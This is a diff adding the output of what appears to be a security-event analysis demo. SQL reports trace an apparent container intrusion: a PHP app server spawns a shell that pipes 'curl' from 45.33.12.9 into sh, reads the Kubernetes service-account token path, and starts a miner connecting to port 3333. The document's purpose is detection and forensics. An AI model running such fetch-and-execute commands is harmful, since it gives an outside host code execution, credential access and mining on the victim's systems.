@@ -1,0 +1,53 @@
+ingested 595 raw events -> 581 events, 25 processes
+
+### Open alerts, top 3 per tenant (ROW_NUMBER over severity, hits)
+  tenant  severity  policy                       pod                 hits  status
+  acme    critical  mining-pool-port             payments-api-7f9c4  40    open  
+  acme    critical  shell-spawned-by-app-server  payments-api-7f9c4  1     open  
+  acme    high      download-tool-executed       payments-api-7f9c4  1     open  
+
+### Kill chain: app server -> shell -> outbound to public IP within 60s (recursive CTE)
+  tenant  pod                 parent_exe  shell_cmd                               connecting_exe  dst              first_after_s  connections
+  acme    payments-api-7f9c4  php-fpm     -c curl -s http://45.33.12.9/x.sh | sh  /usr/bin/curl   45.33.12.9:80    1              1          
+  acme    payments-api-7f9c4  php-fpm     -c curl -s http://45.33.12.9/x.sh | sh  /usr/bin/wget   45.33.12.9:80    4              1          
+  acme    payments-api-7f9c4  php-fpm     -c curl -s http://45.33.12.9/x.sh | sh  /tmp/.k         45.33.12.9:3333  8              40         
+
+### Ancestry of the miner process (recursive CTE, child -> root)
+  depth  pid   exe      args                                    uid  started_at
+  4      1     /pause                                           0    1732600000
+  3      7     php-fpm  --serve                                 33   1732600001
+  2      4242  /bin/sh  -c curl -s http://45.33.12.9/x.sh | sh  33   1732601800
+  1      4244  /bin/sh  x.sh                                    33   1732601802
+  0      4246  /tmp/.k  -o 45.33.12.9:3333 --threads 4          33   1732601807
+
+### Blast radius of the first shell (recursive CTE + aggregation)
+  depth  pid   exe            events  net  file  destinations     paths                                           
+  0      4242  /bin/sh        0       0    0                                                                      
+  1      4244  /bin/sh        2       0    2                      /var/run/secrets/kubernetes.io/serviceaccount/to
+  2      4246  /tmp/.k        40      40   0     45.33.12.9:3333                                                  
+  2      4245  /usr/bin/wget  1       1    0     45.33.12.9:80                                                    
+  1      4243  /usr/bin/curl  1       1    0     45.33.12.9:80                                                    
+
+### Bursts: peak events per pod in any 30s window (window functions)
+  pod                 events_in_window  window_end  avg_gap_s
+  payments-api-7f9c4  31                1732601829  15.5     
+  checkout-5d2b1      5                 1732600019  21.8     
+
+### Who else contacted 45.33.12.9? (expression index on detail.dst_ip)
+  tenant  pod                 exe            ts          port
+  acme    payments-api-7f9c4  /usr/bin/curl  1732601801  80  
+  acme    payments-api-7f9c4  /usr/bin/wget  1732601804  80  
+  acme    payments-api-7f9c4  /tmp/.k        1732601808  3333
+  acme    payments-api-7f9c4  /tmp/.k        1732601809  3333
+  acme    payments-api-7f9c4  /tmp/.k        1732601810  3333
+
+### Full-text search 'secrets' in acme (FTS5, BM25)
+  id   ts          kind  pod                 rank   snippet                                         
+  343  1732601803  file  payments-api-7f9c4  -4.51  file /bin/sh x.sh /var/run/[secrets]/kubernetes.
+
+reopening a resolved alert is refused by a trigger: illegal alert status transition
+
+### Audit trail written by trigger
+  id  alert_id  from_status   to_status     at          actor        
+  1   1         open          acknowledged  1795684782  analyst:priya
+  2   1         acknowledged  resolved      1795684782  analyst:priya
